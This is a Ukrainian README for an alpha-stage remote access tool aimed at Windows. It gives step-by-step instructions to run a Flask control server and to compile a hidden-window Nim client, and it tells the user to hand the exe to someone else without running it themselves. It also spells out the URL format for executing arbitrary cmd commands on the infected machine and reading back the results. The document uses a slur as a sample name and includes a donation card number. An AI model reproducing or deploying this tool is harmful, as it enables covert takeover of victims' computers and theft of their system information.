# **get_he_windows**
## get_he_windows(ghw) - Це альфа-версія програми віддаленого доступу якою можно користуватися в браузері. Поки що тільки для windows. Якщо хочете, то можете спробувати підправити код і скомпілювати файл на linux і macOS.
___
## Що може ця программа?
- Обробітка комманд на віддаленій машині windows
- Дізнатися повний комплект windows
  - процессор
  - оперативна пам'ять
  - ім'я користувача
  - версїю драйверів 
## Якщо ви добре володієте коммандною строкою в windows то вам не буде складно.
---
### Встановлення та перший запуск.
### Клонуйте репозиторій та зайдіть в дерикторію ``` server(python) ```.
### Перевірте наявність python цією командою: ```python -v ```
### Встановіть бібліотеки ціею командою:
```
pip install flask openpyxl
```
### Далі запускаемо сервер командою:
```
python server.py
```
### Вертаїмось до деректорії та заходимо в дерикторію ``` client(nim-lang) ```
### Перевірте, чи встановлен у вас nim-lang та gcc командою ``` nim -v ``` та ```gcc --version```. Якщо все окей, то вивід команд має бути подобний до цого:
```
C:\Users\User>nim -v
Nim Compiler Version 1.6.10 [Windows: amd64]
Compiled at 2022-11-21
Copyright (c) 2006-2021 by Andreas Rumpf

C:\Users\User>gcc --version
gcc (MinGW-W64 x86_64-posix-seh, built by Brecht Sanders) 11.1.0
Copyright (C) 2021 Free Software Foundation, Inc.
This is free software; see the source for copying conditions.  There is NO
warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.

```

### Далі відкриваете файл як документ через будь який редактор та шукаете змінну ` name ` та вписуєте туди своє ім'я ``` let name = "gandon" ``` та в змінній `your_adress` пишете свою url-адресу `let your_adress = "http://127.0.0.1:5000"`
### Зберігаєте та компілюете командою:
```
nim c -d:release -d:danger --app:gui .\main.nim
```
### В жодному разі не відкривайте ехе файл який у вас вийшов! Дайте його, кому хотіли дати)
### Основний url-запрос з якого все працує:
```
http://127.0.0.1:5000/users_get?input=name_admin-password_admin-username-command_windows
```

### Думаю що тут всі розберуться, аля я всеж розповім що за що відповідає:
- `name_admin` - замість цого ви пишите ім'я адміністратора(тобто ваше)
  - щоб додати адміністратора введіть в браузері наступний url-адрес `ваш_url/add_admins?info=name_admin-password_admin` замінивши `name_admin` та `password_admin` на свої
- `password_admin` - пароль від імені адміністратора
- `username` - ім'я 
- `command_windows` - команда віндовс, саме cmd команда.
### Щоб побачити відповідь від консолі віндовс ви змінюєте вашу комманду на слово `wait`
```
http://127.0.0.1:5000/users_get?input=name_admin-password_admin-username-wait
```
### Це був тестовий проєкт та дуже не допрацований, але можете брати мій кож, переробляти та додавати щосб своє. Я не буду продовжувати працу над цим проєктом. Якщо вам сподобаєця цей проект то я відновлю свою працю над ним, та якщо вам не важко підкиньте не дуже копійок на карту: `5375411425732190` або через [DonationAlerts](https://www.donationalerts.com/r/fruitjuicecode)

---
# Все що ви зробитє з ціею программою лежить тільки на вас! Автор не нисе відповідальність за вас!
